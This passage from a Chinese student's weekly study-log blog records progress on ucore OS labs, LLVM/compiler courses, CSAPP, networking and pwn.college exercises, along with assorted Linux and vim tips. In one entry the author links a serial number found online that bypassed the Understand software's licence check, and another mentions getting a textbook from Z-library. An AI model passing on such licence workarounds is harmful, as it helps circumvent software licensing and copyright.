了解了下label是个啥(现在忘了)</li><li>编译原理终于完成了, 下一阶段操作系统+中间代码优化</li><li>开始一点点操作系统</li></ul><h3 id="第十八周-11-08-11-14"><a href="#第十八周-11-08-11-14" class="headerlink" title="第十八周: 11/08-11/14"></a>第十八周: 11/08-11/14</h3><ul><li><strong>11/08:</strong> <ul><li>网上随便整了个<a href="https://blog.csdn.net/weixin_43940314/article/details/111279768">序列号</a>就通过了understand的验证, 这软件还真够直接的, 不过我更想在我的kali上弄这些, 先用着试试看. <a href="https://www.cnblogs.com/wayne-tao/p/11911566.html">这是windows的</a> </li><li>rpm包的命名规范官网, →<a href="https://rpm-packaging-guide.github.io/#epoch">这里</a>.        3:3.1被认为比2:3.2更新。</li><li>好像第二次查硬链接和软连接的区别了, 起因是无法使用qemu而要<strong>使用qemu-system-i386或qemu-system-x86_64指令替换qemu指令.</strong> 可以利用软链接<code>ln -s /usr/bin/qemu-system-i386 /usr/bin/qemu</code>创建一个快捷方式一样的东西</li><li>操作系统的kali环境算是弄好了一大半(我再也不敢说已经弄好了), 剩下的就是要熟悉一下各种软件的操作</li></ul></li><li>其余时间<ul><li>整了两三行的bat一键上传blog</li><li>blog图片换成了本地, 还是怕sm.ms跑路, 以前的就不更新了. 找到了一个最保险的办法, 就是两边都存</li><li><code>dpkg-reconfigure tzdata</code>搞定kali时间不准问题</li><li>装上understand, 压缩包已存, 下载<a href="https://s3.amazonaws.com/builds.scitools.com/all_builds/b1029/Understand/Understand-5.1.1029-Linux-64bit.tgz">地址</a> </li><li><em>apt install <strong>gnome-terminal</strong>,</em> 调试得以继续运行</li><li><a href="https://stackoverflow.com/questions/5295903/how-many-bits-does-a-word-contain-in-32-64-bit-os-respectively">一个word有几位? / How many bits does a word contain in 32-bit OS?</a> </li><li><a href="https://www.zhihu.com/question/344805337/answer/819338479">pdf文件添加目录</a> </li><li>拓展内联汇编 <a href="https://www.cnblogs.com/thammer/p/12591383.html">link</a> </li><li>keymap调试完成</li></ul></li><li>python多版本问题 <a href="https://blog.csdn.net/weixin_39278265/article/details/82938270">link</a>: repaire或者<code>python -m pip install -U pip</code> 就行</li></ul><h3 id="第十九周-11-15-11-21"><a href="#第十九周-11-15-11-21" class="headerlink" title="第十九周: 11/15-11/21"></a>第十九周: 11/15-11/21</h3><ul><li>windows下vscode莫名无法拖动文件标签, 快捷方式设为管理员启动然后再取消掉就没事了</li><li>虚拟机里的vscode果然还是用的怪怪的, 换成windows下的写完再粘贴进去debug</li><li>终于挂载成功了, 问题不是vmware-tools没装好, 也不需要加载ISO文件, <code>sudo vmhgfs-fuse .host:/ /mnt/hgfs</code>不成功不是因为vmtools的问题, 而是和报错说的一模一样, <code>&#39;/mnt/hgfs&#39;: No such file or directory</code>. 真绝了, 新建个hgfs就完事了<br>悲报, 可能每次重启我都要执行这一句命令…….:sweat: </li><li><a href="https://blog.csdn.net/MACMACip/article/details/106406066">C语言变量声明时加冒号的用法</a>: C语言提供了一种数据结构，称为“位域”或“位段”</li><li>16号Lab1暂时完成, 开始下一个Lab的学习</li><li><a href="https://stackoverflow.com/questions/8564532/colon-in-c-struct-what-does-it-mean/85645973#answer-19691081">“:” (colon) and “.”(dot) in C struct</a> 结构体中的冒号和点号</li><li>c语言结构体名称和结构体变量<strong>可以同名</strong> </li><li>感觉gdb帮助也是有限, 一个调试还是要把代码看懂了再用gdb查看运行时变量的变化, 而且如果没有特殊情况还很难发现小错误</li></ul><h3 id="第二十周-11-22-11-28"><a href="#第二十周-11-22-11-28" class="headerlink" title="第二十周: 11/22-11/28"></a>第二十周: 11/22-11/28</h3><ul><li><a href="https://blog.csdn.net/rosetta/article/details/90746936">&amp;((type *)0)-&gt;member</a>: ANSI C标准允许值为0的常量被强制转换成任何一种类型的指针，并且转换的结果是个NULL，因此<code>((type *)0)</code>的结果就是一个类型为<code>type *</code>的NULL指针. 编译器还会对这种形式的宏定义做出优化, 只取出地址而不访问<br>(type *)NULL的成员member.</li><li>感觉是时候看一波网上的<a href="http://c.biancheng.net/asm/">汇编教程</a>了, 每天看一点就成, 免得看到一些指令还要一个一个搜</li><li>学的少了, 不过考完了全部期中考, 可以有更多时间来做了</li><li>周六<ul><li>整了正则替换, 像什么[0-9]*想了半天原来是0次到多次, 会匹配全文, 还是要熟练一下</li><li>弄了一点模型机, 意思一下</li></ul></li><li>周天<ul><li>三点前在整keymap和windows的vim, 总爱折腾这些东西, 不过配置好后还挺好用的 <a href="https://vimhelp.org/change.txt.html#%3Acopy">vim移动/复制行</a> <a href="https://vimhelp.org/motion.txt.html#%27%3C">可视模式选择的区域</a> </li><li>看了点汇编</li></ul></li></ul><h3 id="第二十一周-11-29-12-5"><a href="#第二十一周-11-29-12-5" class="headerlink" title="第二十一周: 11/29-12/5"></a>第二十一周: 11/29-12/5</h3><ul><li>看Lab3的视频中……</li><li>花了剩下的几天时间写完了学校的cpu, 并且完成了板上的时序仿真, 等待下周二的实板测试</li></ul><h3 id="第二十二周-12-6-12-12"><a href="#第二十二周-12-6-12-12" class="headerlink" title="第二十二周: 12/6-12/12"></a>第二十二周: 12/6-12/12</h3><ul><li>写CPU都适用的VIM, 找到了一个vim教程网站感觉挺有用 <a href="https://yyq123.github.io/learn-vim/">link</a>, 剩下的配置在_vimrc里, 解决了复制到系统剪贴板的问题和保存会话的问题</li><li>写了一周的CPU, 能运行程序了, 不过排个序都得要没有循环的八十多行的代码, 也是一绝</li><li>周三开始继续学操作系统</li><li>补了一下ucore的部分内容,  看了几天汇编语言, 对一些伪指令以及真实的汇编程序的结构有了认识, 对IDA反汇编的一些以前看不懂的东西也能读懂他的含义了</li><li>周六现学python的文件操作, 学了一点os, random, shutil库的函数, 还是有需求推动学的快</li><li>周天看CSAPP的处理器体系结构部分, 小有收获, 看的比较流畅</li></ul><h3 id="第二十三周-12-13-12-19"><a href="#第二十三周-12-13-12-19" class="headerlink" title="第二十三周: 12/13-12/19"></a>第二十三周: 12/13-12/19</h3><ul><li>花了几天看了CSAPP的处理器体系结构章节, 大有收获, 主要是pipeline processor的设计思考过程一步一步非常详细, 可以说是锻炼思维能力了, 但这只是1980s的理论水平</li><li>周四早上, 终于看完了Processor Architecture, 至于实验等假期再做吧, <u>继续开始操作系统内存管理部分</u> </li><li>周五, 操作系统Lab3, 安装了Windows default keymap, linux里的vscode勉强能用</li><li>可能需要切换一下策略, 直接参照答案学习, 理解写出文档就算成功, 不然看了两天才补完Lab1中的challenge, 还以为是task switch…</li><li>明天看看自动完成合并的diff和patch命令</li></ul><h3 id="第二十四周-12-20-12-26"><a href="#第二十四周-12-20-12-26" class="headerlink" title="第二十四周: 12/20-12/26"></a>第二十四周: 12/20-12/26</h3><p>本周的任务是操作系统, 一下是除了这个之外的小东西</p><ul><li><p>典中典: <strong>我以为我看懂了</strong> </p></li><li><p>STI指令: 响应可屏蔽的硬件中断, 在kern_init()中的intr_enable()执行, 就算没设置也能执行<strong>软中断</strong> </p></li><li><p>Typora崩溃了, 我也快崩溃了, 写了三天的东西莫得了, 自动保存直接断绝后路</p></li><li><p>完善了一下用来备份的bat程序, 每十分钟备份一次(我就是要自动保存!</p></li><li><p>c/c++默认返回值是<strong>1</strong>, 我没写导致出错</p></li><li><p>周三, 整了下快捷方式的快捷键; 学点patch和diff的补丁文件, 知识get!</p><ul><li><p>装了个tree包</p></li><li><p><a href="http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html">diff输出文件</a> <a href="https://blog.csdn.net/longintchar/article/details/74151042">patch一般方法</a> <a href="https://blog.csdn.net/longintchar/article/details/74139933">diff一般方法</a> </p><p><code>patch -[R]pn &lt; 补丁文件</code> <code>diff -bruP [directory1] [directory2] &gt; [patchfilename.patch]</code> </p></li></ul></li><li><p>周四, 只能说那东西有点上头, 还是不碰为妙</p><ul><li><a href="https://www.zhihu.com/question/23014322">volatile相关</a> </li><li>ctrl+k在understand里面看大纲</li><li><a href="https://rtoax.blog.csdn.net/article/details/108663549">SLOB、SLAB、SLUB</a> </li></ul></li><li><p>周末:</p><ul><li>vscode的formatter用得顺手, 导致我diff+patch很难过T_T</li><li><strong>patch只能使用带有-u或者-c参数的diff文件</strong>, 而且带有上下文, patch很容易fail </li><li>vscode修改为大括号sameline: <code>&quot;C_Cpp.clang_format_style&quot;: &quot;&#123;BasedOnStyle: Chromium, IndentWidth: 4&#125;&quot;</code><br><a href="https://blog.csdn.net/softimite_zifeng/article/details/78357898">clang-format参数</a> </li></ul></li></ul><h3 id="第二十五周-12-27-1-2"><a href="#第二十五周-12-27-1-2" class="headerlink" title="第二十五周: 12/27-1/2"></a>第二十五周: 12/27-1/2</h3><ul><li>周一, 经典再现, 我果然没有看懂地址映射的四个阶段, 又重新看了一次ucore自带的一个设置好的页目录表和相应的页表<br>又折腾了半天</li><li>装了一个info包, 暂时只知道能看info ld</li><li><code>make grade</code>在虚拟机共享文件夹里出错了, 诶想省事又有点麻烦的东西</li><li>弄了一个多小时, 博客想加上汇编代码高亮, 没有成功, 和Typora的配合不是很好, 鸽了</li><li>Dirty COW的网站上有个东西好有趣<ul><li>How do I uninstall Linux? Please follow <a href="https://youtu.be/MZrdrfdAl44?t=14">these</a> instructions. </li></ul></li><li>VMware对于在虚拟机中选中的文本会自动复制到宿主机中</li><li>周四, ucore开始快一个月了, 进展到了Lab6</li><li>折腾了快一个小时, 结果发现需要update lab5的代码才能正确make qemu, 乌鱼子………为什么总在这种无意义的事情上浪费时间<ul><li>周五下午三点, 人已被气晕, exercise0怎么改都不行, 重新clone了肖佬的lab6, 绝了</li><li>发现肖佬是把出错的那一句直接注释了, 未曾设想的道路</li></ul></li><li>元旦当天, 不进行格式化的合并就是舒服 &amp;&amp; 尝试clash再次失败, 下次不弄了</li><li>装了一个apt install <a href="https://graphviz.org/">graphviz</a>, an open source graph visualization software</li><li>深受翻译版所害, signaling process直接叫做信号进程</li></ul><h3 id="第二十六周-1-3-1-9"><a href="#第二十六周-1-3-1-9" class="headerlink" title="第二十六周:1/3-1/9"></a>第二十六周:1/3-1/9</h3><ul><li><p>开始lab8</p></li><li><p>print working directory = pwd</p></li><li><p><a href="https://blog.csdn.net/weixin_40204595/article/details/81109644?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&utm_relevant_index=1">C语言宏定义中 ## 和#的作用</a> </p></li><li><p>magic numbers</p></li><li><p>这个highlightjs+hexo我不改变一下文件他就不动配置了, 搞得代码块白底白字, 还得手动在每个文件都加上一个空格.</p></li><li><p>do {…} while (0) 在宏定义中的作用: 能够正确的让多条语句按我们的意愿工作.</p></li><li><p>尝试了一下ssh连接虚拟机, 只要执行一下几条命令即可, 使用了一下XShell, 要弹出qemu的窗口还要装东西……</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-get update<br>apt-get install openssh-server<br>systemctl <span class="hljs-built_in">enable</span> ssh.service<br>vim /etc/ssh/sshd_config <span class="hljs-comment"># 改成允许root用户登录</span><br>/etc/init.d/ssh restart<br></code></pre></div></td></tr></table></figure></li><li><p>要用understand记得要注意编码问题以及及时重新分析所有文件(windows默认GBK编码</p></li><li><p>周六, 虽然在复习周, 但是马上就要完成ucore了. <strong>周天, ucore完成</strong> </p></li><li><p>装上了ahk语法高亮, 硬是整了个小脚本</p></li></ul><hr><h2 id="开始寒假-pwn-college-计网"><a href="#开始寒假-pwn-college-计网" class="headerlink" title="开始寒假(pwn.college+计网)"></a>开始寒假(pwn.college+计网)</h2><h3 id="第二十七周-1-10-1-16"><a href="#第二十七周-1-10-1-16" class="headerlink" title="第二十七周:1/10-1/16"></a>第二十七周:1/10-1/16</h3><ul><li>gVim是vim的一种, 指GUI Vim, 还有其他的模式可以通过 vim -参数 来指定</li><li>考试周, 看了一点pwn.college的YouTube视频, 介绍视频感觉还挺多的, 是时候再写一篇blog了</li><li>对了, 每天要复习一点前面的东西, 不然到时候就等于重新看了</li><li>考完了, 考 完了, 考 完了, 16号开始一点计算机网络, 计算机系统, 和pwn.college<ul><li>找到了计算机网络书配套网站: <a href="https://media.pearsoncmg.com/aw/ecs_kurose_compnetwork_7/cw/">部分资源</a>以及<a href="http://gaia.cs.umass.edu/kurose_ross/index.php">主页</a>, 以及在Z-library上找到了英文第八版.</li><li><a href="http://gaia.cs.umass.edu/kurose_ross/eighth.php">第八版的改动</a> </li><li>别人的计网<a href="https://blog.csdn.net/wwj17647590781/category_11065625.html?spm=1001.2014.3001.5482">笔记</a> </li><li>研究笔记要怎么写用了一点时间, 干点别的去了</li></ul></li></ul><h3 id="第二十八周-1-17-1-23"><a href="#第二十八周-1-17-1-23" class="headerlink" title="第二十八周:1/17-1/23"></a>第二十八周:1/17-1/23</h3><ul><li><strong>17: 看计网, 明天开始pwn.college</strong> </li><li><strong>18:</strong> 找到了一个下载Github单个文件夹的<a href="https://downgit.github.io/#/home">网站</a>, 以及把tree/master替换为<strong>trunk</strong>. 然后用：svn checkout [source]</li><li>计网开始第二章, 第一章东西也真够多的</li><li>看一点concurrent programing….还有先后关系, 先看network programming…呃呃, 还是看system I/O吧…</li><li><strong>19:</strong> <a href="https://www.cnblogs.com/zy691357966/category/827251.html">CSAPP笔记</a>全markdown的狠人</li><li><a href="https://www.jianshu.com/p/9268ac2c8e5f">掩码</a>是个啥, Youtube<a href="https://www.edunews.net.cn/2020/hlw_0622/11069.html">快捷键</a> </li><li>看了CSAPP后几章和pwn.college. </li><li><strong>20:</strong> <a href="http://blog.chinaunix.net/uid-9474419-id-400907.html">/dev/tty和pty等等</a> </li><li>还在ELF格式中挣扎. </li><li><strong>21:</strong> Xshell的<a href="https://www.kali.org/docs/general-use/python3-transition/">警告信息</a>, 不想看, 只要<code>touch ~/.hushlogin</code>这个文件就可以隐藏了, 删除后又显示</li><li>看了一点computer networking</li><li>man手册还能<a href="https://www.cnblogs.com/chao1118/p/3715523.html">装中文</a>, 不想折腾了, 安排了<code>apt install manpages-dev</code>可以查看系统调用</li><li><strong>22:</strong> cc命令最终链接到gcc, 这是为了向后兼容</li><li>连pwn.college慢的一批, 也为了计算机系统课装个Ubuntu了, 再弄个clash</li><li>见识到了好多新的命令, linux有多的操作就写在Linux使用里吧.<ul><li>干脆把那个弄成清单, 然后具体细节写在每个WP里就可以了</li><li>runoob上的命令大全每天看一点得了, <strong>至少混个眼熟</strong> </li></ul></li><li><strong>23:</strong> 终于, 在ubuntu弄好了clash, 深深感到原理一个都不知道只会操作软件的痛苦….<a href="http://t.zoukankan.com/huang-xiang-p-13922394.html">link</a> </li><li>看计网</li></ul><h3 id="第二十九周-1-24-1-30"><a href="#第二十九周-1-24-1-30" class="headerlink" title="第二十九周 1/24-1/30"></a>第二十九周 1/24-1/30</h3><ul><li><strong>24:</strong> 继续很多的计网和一点pwn.college</li><li><strong>25:</strong> ASCII码中的<a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes#C1_controls">控制字符</a>就是按键盘上的Ctrl+字母符号来打出的,<br><strong>Caret(^) notation</strong> is a notation for unprintable control characters in ASCII encoding<br>The actual meaning or interpretation of the individual control-codes is not prescribed by the caret notation, and although the ASCII specification does give names to the control-codes, it does not prescribe how software should respond to them.</li><li>学了一波screen, <del>也不知道有啥用就是了…</del> , 真香.</li><li>快捷键没完没了了, <strong>一个终端还有这么多</strong> </li><li>pwn.college做到了(?)</li><li><strong>26:</strong> 一点点pwn.college和科目四</li><li><strong>27:</strong> pwn.college+computer networking</li><li>看了一篇PIPE&amp;FIFO的文章, 看不下去了话真的太多了, 也是佩服一篇博客需要这么多字的. <strong>还是linux manual管用</strong>.</li><li><strong>28-30</strong> 看计网和pwn.college.</li></ul><h3 id="第三十周-1-31-2-6"><a href="#第三十周-1-31-2-6" class="headerlink" title="第三十周 1/31-2/6"></a>第三十周 1/31-2/6</h3><ul><li>1/31: 除夕夜, 还在看计网. 看的属实有点慢.</li><li>2/1-2/2: 计网+春节.</li><li>2/3-4: 看书, 进度315/775</li><li>2/5: 连着看了几个小时看不下去了, 不重要的直接跳过不看了.</li></ul><h3 id="第三十一周-2-7-2-13"><a href="#第三十一周-2-7-2-13" class="headerlink" title="第三十一周: 2/7-2/13"></a>第三十一周: 2/7-2/13</h3><ul><li>2-8: 下午五点, 前六章看完. 巩固下知识(除了算法)</li><li>2-9-13: 终于看完了, (摸:fish:了一天)</li><li>开始pwn.college!</li></ul><h3 id="第三十二周-2-14-2-20"><a href="#第三十二周-2-14-2-20" class="headerlink" title="第三十二周: 2/14-2/20"></a>第三十二周: 2/14-2/20</h3><ul><li>14: 发现要自己写汇编代码, 之前看过的一部分还算用到了, 还好做了笔记不然和没看一样. 以前都是看现成的都没有自己写过.</li><li>python3.8特性: <a href="https://zhuanlan.zhihu.com/p/90992431">Assignment expressions</a>: <code>:=</code>和<code>=</code>是补充关系并不是替换关系</li><li><a href="https://cloud.tencent.com/developer/ask/106533">deadbeef渊源</a> 和<a href="https://en.wikipedia.org/wiki/Hexspeak">Hexspeak</a>有关系. 这个Hexspeak也挺有意思, 是用16进制数字来表示英文单词, 可用来编魔数.</li><li>15:  Linux的typora里双击或选中会自动删除文字居然是这个<a href="https://blog.csdn.net/litao31415/article/details/51082530">原因</a> </li><li>自己亲自动手写起汇编代码才发现这么多细节没有注意到, 要抓紧时间练练了, 这上面的题目还都比较基础嘞.</li><li>16: 还在pwn.college</li><li>Undefined Behavior -&gt; <a href="https://riptutorial.com/cplusplus/topic/1812/undefined-behavior">here</a> and <a href="https://blog.llvm.org/2011/05/what-every-c-programmer-should-know.html">here</a> <ul><li>signed overflow (which is undifined behavior) -&gt; <a href="https://www.airs.com/blog/archives/120">here</a> and <a href="https://stackoverflow.com/questions/18195715/why-is-unsigned-integer-overflow-defined-behavior-but-signed-integer-overflow-is">stackoverflow</a> </li></ul></li><li>17: 一点点的pc, shellcode injection又有好多的资料引用和视频, 全看完得几天时间(一天半就看完了)</li><li>18: 看完了pc的shellcode module视频, 引用文章看个两篇就结束了.</li><li>复习操作系统. ….到底需要一个何等庞大的基础知识体系啊……(tm拖了两天才要开始)</li><li>看了一点disk image的相关wikipedia: <a href="https://en.wikipedia.org/wiki/Disk_image">disk image</a> | <a href="https://en.wikipedia.org/wiki/Loop_device">loop deivce</a> | <a href="https://en.wikipedia.org/wiki/Device_file#Block_devices">device file</a> <ul><li>还有Disk image和optical disc image区别:<br>A disk image, in computing, is a computer file containing the contents and structure of a disk volume <strong>or of an entire data storage device</strong><br>An optical disc image <strong>is a disk image</strong> that contains everything that would be written to an <strong>optical disc</strong> </li><li>Once you’ve downloaded an ISO Image you can mount it as a loopback device. </li><li>It may be used to install an operating system onto a file system without repartitioning a disk.</li></ul></li><li>19-20: 回学校准备中, 不知道学了啥, 至少是复习了ucore</li></ul><h2 id="开学了-pc-编译原理"><a href="#开学了-pc-编译原理" class="headerlink" title="开学了!(pc+编译原理)"></a>开学了!(pc+编译原理)</h2><h3 id="第三十三周-2-21-2-27"><a href="#第三十三周-2-21-2-27" class="headerlink" title="第三十三周 : 2/21-2/27"></a>第三十三周 : 2/21-2/27</h3><ul><li>21:复习CS143, 今天或许能复习完. <ul><li>答案是不能, <strong>诶明天随便看看bison的东西吧. 然后再看看cscd70, 再然后看看LLVM IR Pass</strong> </li></ul></li><li>22: 如上所述, 主要看了CSCD70. 今天没有课.</li><li><a href="https://en.wikipedia.org/wiki/Compiler#Three-stage_compiler_structure">What is complier’s front end</a> 在课件里找到了, 一开始还去WiKi上查.</li><li>23: 继续CSCD70(看完了lecture 1)</li><li>an <strong>induction variable</strong> is a variable that gets increased or decreased by a fixed amount on every iteration of a loop or is a linear function of another induction variable.</li><li>不知道该不该看视频, 感觉优点在于能练习一点听力以及听一些问答, 缺点的话会慢一些, 不过这么一想倒是利大于弊了.</li><li>24: 继续CSCD70. 第三个视频看了一半多</li><li><a href="https://en.wikipedia.org/wiki/Number_sign#Mathematics">Number sign</a> in <code>#def</code>. It turns out to be the mathematic sign.</li><li>25: 看完第三个. 查了live variable analysis的作用.</li><li>还查了计算机系统小班课的第二个问题: 不同操作系统, 不同编译器, 不同处理系架构对生成目标文件的过程有什么影响.<ul><li>gcc由cc1, as, ld三个部分组成, 另外一个llvm把cc1模块化为三个部分, 然后正常汇编, 链接时可选optimization.</li><li>Clang只是一个front end.</li></ul></li><li>26-27: 查RFC中的ipv4和ipv6, 不知道在哪里有写. 还有C99待看</li><li>复习补充linux命令(操作系统小班课)</li><li>有空看下IBM网站, 上面好像挺多有用的博客资料啥的..</li><li>system programming in c or c++? -&gt; <a href="https://darkbears.com/blog/why-c-continues-to-the-preferred-systems-programming-language/">link</a> </li><li>这两天都在做计网实验, 要写c99程序和测试程序, 边翻文档编写是慢了点. 不如说我敲代码好像一直都慢了点…..</li></ul><h3 id="第三十四周-2-27-3-6"><a href="#第三十四周-2-27-3-6" class="headerlink" title="第三十四周: 2/27-3/6"></a>第三十四周: 2/27-3/6</h3><ul><li>27-1: <a href="https://stackoverflow.com/questions/9257085/how-can-i-scroll-back-in-gdbs-command-window-in-the-tui-mode">How can I scroll back in GDB’s command window in the TUI mode?</a>  </li><li><a href="https://vimhelp.org/cmdline.txt.html#%5Brange%5D">vim range 范围</a> and <a href="https://vimhelp.org/usr_10.txt.html#10.3">this</a> </li><li>debugging Infomation: <a href="https://unix.stackexchange.com/questions/219550/what-is-linux-native-debugging-symbols-format">native format</a> | GCC 4.8 change to DWARF4 | -g -gstabs -gxcoff -gstabs+ | peda</li><li>2-4: 装docker看视频和pwn.college.<ul><li>docker的DNS解析错误无法<code>sudo apt-get update</code>, <a href="https://robinwinslow.uk/fix-docker-networking-dns">解决办法</a> (还是不如换源有用) .</li><li>看了几节多伦多大学油管上的英文视频还是挺有意思的, 就当锻炼了一下听力吧, 倒回来看哈工大视频. compiler的front end看的挺累的, 不过优化部分看起来意义更明了一些, 努力一下看下两三周弄得完不.</li></ul></li><li>5: 哈工大的视频相当紧凑, 不知道内容有没有少一些. 主要是英文没法两倍速, 要不然就听不懂了…..<ul><li>What is orchestration? -&gt; <a href="https://en.wikipedia.org/wiki/Orchestration_(computing)">WiKipedia</a> </li><li>What is the container? -&gt; <a href="https://medium.com/@saschagrunert/demystifying-containers-part-i-kernel-space-2c53d6979504">here</a> </li><li>CMake vs. Make , and What is CMake? <a href="https://www.incredibuild.com/blog/cmake-vs-make">link</a> </li></ul></li><li>6: 有点颓废.<ul><li>在看llvm的文档, 要不然这个过程是一无所知….. <a href="http://www.aosabook.org/en/llvm.html">link</a> </li><li><a href="https://en.wikipedia.org/wiki/Just-in-time_compilation#Design">JIT</a> and AOT(self-evident) | <a href="https://en.wikipedia.org/wiki/First-class_citizen">first class language</a>?? | Archive file | </li></ul></li></ul><h3 id="第三十五周-3-7-3-13"><a href="#第三十五周-3-7-3-13" class="headerlink" title="第三十五周: 3/7-3/13"></a>第三十五周: 3/7-3/13</h3><ul><li>7: <a href="https://devopsonwindows.com/what-makes-a-build-system/">build system</a> | 只能去看在线的llvm手册了.装好的docker还是别去执行unminimize这种命令了.</li><li>8: docker的相关命令.</li><li>9: 计网实验中. Return/Enter Key | Wireshark手册 | 每日单词进行中 | </li><li>10:什么神奇计网, 水过得了, 除了浪费时间没啥意义.</li><li>11: 啊啊啊我要学llvm, 怎么感觉前几天效率这么低呢.<ul><li>看了clang和llvm文档(比如-emit-code), 了解了一下如何写出一个pass. cmake写法待看.</li><li>指导书里面的clang还有优化选项, 不明白这是在整啥, 去掉好像也没事. clang到底是前端还是编译驱动啊? </li><li>取消windows防火墙阻挡ICMP报文. <a href="https://superuser.com/questions/1412029/traceroute-shows-just-in-linux-in-a-virtual-machine-although-displays">link</a> </li></ul></li><li>12: 开卷.<ul><li>整了个<strong>zsh</strong>. <a href="https://seamatinee.com/2021/09/23/ubuntu-customization/#Terminal-%E7%BE%8E%E5%8C%96">link</a> | C++作者<a href="https://www.stroustrup.com/C++.html">网站</a> | RTTI, 没看懂 | first class也没看懂 | <a href="https://www.doxygen.nl/index.html">doxygen</a>是个啥 | clash添加规则</li><li>还在Assignment1, 把LLVM的东西看一遍哪有这么快啊.</li></ul></li><li>13: 又看了一天的文档+补掉课内的无聊作业. 把LLVM设计结构看了个大概, 有点通透的感觉了(</li></ul><h3 id="第三十六周-3-14-3-20"><a href="#第三十六周-3-14-3-20" class="headerlink" title="第三十六周: 3/14-3/20"></a>第三十六周: 3/14-3/20</h3><ul><li>14: 怎么还在看文档. 弄了vscode编辑, 纯vim真是接受不能. woc好像快三周了, 我还没搞完, 还有makefile和cmake的语法没看呢.</li><li>15: <a href="https://en.wikipedia.org/wiki/User_space_and_kernel_space#USERLAND">userland</a>(user space) | <a href="https://en.wikipedia.org/wiki/FreeBSD">FreeBSD</a> | <a href="https://en.wikipedia.org/wiki/Copyleft">copyleft</a>,<a href="https://en.wikipedia.org/wiki/GNU_General_Public_License">GPL</a> | Ninja | <ul><li>看了cmake&amp;&amp;make&amp;&amp;C++虚继承. 然后开始写代码.</li></ul></li><li>16:  static member functions(<a href="https://stackoverflow.com/questions/2315166/where-would-you-use-a-friend-function-vs-a-static-member-function">stackover</a> &amp; <a href="https://en.cppreference.com/w/cpp/language/static">cppref</a>) | <ul><li><code>replaceAllUsesWith()</code>这个函数我看了半天, stackoverflow查了查llvm文档又看了看, 还去doxygen看源码, 终于看懂llvm是怎么组织这一对关系的了. 具体在CSCD70笔记里.</li></ul></li><li>17: 继续cmake和Assignment2.<ul><li>搜到一篇好文, vim的窗口使用, <a href="https://linuxhint.com/opening_switching_multiple_files_vim/">here</a> </li></ul></li><li>18-20: pwn.college</li></ul><h3 id="第三十七周-3-21-3-27"><a href="#第三十七周-3-21-3-27" class="headerlink" title="第三十七周: 3/21-3/27"></a>第三十七周: 3/21-3/27</h3><ul><li>21-23: capstone engine(一个反汇编引擎) | <a href="https://www.geeksforgeeks.org/difference-between-fork-and-vfork/">vfork&amp;fork</a> <ul><li>pwn.college.</li></ul></li><li>24: <a href="https://en.wikipedia.org/wiki/Concolic_testing">concolic execution</a> | <a href="https://en.wikipedia.org/wiki/Symbolic_execution">Symbolic execution</a> | <p hidden>小班真折磨, <strong>水平差太多</strong>有点无法沟通的感觉, 我书都看完了他们才刚开始….</p> </li><li>25-26: 封校, 计网小班, 无了</li><li>27: windows网卡必须是英文名才能代理 | <a href="https://en.wikipedia.org/wiki/POSIX">POSIX</a> 和 System V的linux系统调用<a href="https://blog.csdn.net/return_cc/article/details/78417642">关系</a>| <ul><li>pwn.college</li></ul></li></ul><h3 id="第三十八周-3-28-4-3"><a href="#第三十八周-3-28-4-3" class="headerlink" title="第三十八周: 3/28-4/3"></a>第三十八周: 3/28-4/3</h3><ul><li>28-29: 疫情疫情疫情  pwncollege | discord’s direct message (DM) | <a href="https://tanqisen.github.io/blog/2013/01/13/vim-search-replace-regex/">vim regex</a> | <a href="https://en.wikipedia.org/wiki/Binary_File_Descriptor_library">BFD</a> &amp; objdump+readelf<br><a href="https://docs.kernel.org/filesystems/proc.html">/proc(kernel doc)</a> | <a href="https://floatingoctothorpe.uk/2017/dumping-memory-with-gdb.html">dumping memory with gdb</a> | <p hidden>复习了一下malloc以及gdb中的操作, 因为执行环境的原因之前的堆题我都没有使用过gdb来调试, 今天趁着小班课一弄累得半死, 一会儿对齐没搞明白, 一会儿小端法没看出来, 又一回儿被指针弄晕(把指向堆的指针赋值为只读data, 还在那儿想为什么p1不在maps里的heap段中???? 真绝了, 不过复习了一点点点点malloc, 熟悉了一下gdb的操作.</p></li><li>30: <a href="https://luomuxiaoxiao.com/?p=516">elf启动流程</a>(是时候看看程序员的自我修养了) | <p hidden>小班课又栽进去几个小时, 好心录个视频希望更多人能看见吧.</p> </li><li>31-1: <p hidden>啊这, 一个小班课上午基本就没了, 然后下午调了下mykeymap, 晚上看了看日语和单词, 看了看bomblab, 一天没了……</p>bash的<a href="https://www.gnu.org/software/bash/manual/html_node/Shell-Expansions.html">manual</a>可以一看 | <ul><li>看sandboxing的视频, 看了两遍感觉细节还是很多. 就像我小班课上和别人讲题目, 一些小操作我都没有去解释, 第一次见肯定会觉得信息量过大.</li></ul></li><li>2: <a href="https://unix.stackexchange.com/questions/4126/what-is-the-exact-difference-between-a-terminal-a-shell-a-tty-and-a-con">tty terminal shell…</a>&amp;<a href="https://askubuntu.com/questions/14284/why-is-a-virtual-terminal-virtual-and-what-why-where-is-the-real-terminal">short explain</a>&amp;<a href="https://en.wikipedia.org/wiki/Computer_terminal">computer terminal</a> | pwn.college-babyjail.<ul><li>terminal在以前是一台实际的设备, 在今天的图形化界面系统中更多使用的是terminal emulator, 而不需要一台真实的terminal.</li><li><strong>tty</strong>–teletype(writer): accessing the computer by sending keystrokes to it and receiving output back from it, printing it to a piece of paper.</li><li>gnome-terminal and konsole are themselves <strong>running on a tty</strong>, 包括graphical subsystem.</li><li>为什么在termnal emulators里能使用^H(就是backspace)这样的<a href="https://en.wikipedia.org/wiki/ANSI_escape_code">ANSI escape code</a>? 因为尽管hardware text terminals have become increasingly rare in the 21st century, the relevance of the ANSI standard persists because a great majority of terminal emulators and command consoles interpret at least a portion of the ANSI standard.</li><li>直接看kp的<a href="https://kiprey.github.io/2021/10/kernel_pwn_introduction/#1-%E7%BB%88%E7%AB%AF%E8%AE%BE%E5%A4%87%E7%B1%BB%E5%9E%8B%E7%AE%80%E4%BB%8B">终端设备类型简介</a> </li></ul></li><li>3: babyjail | 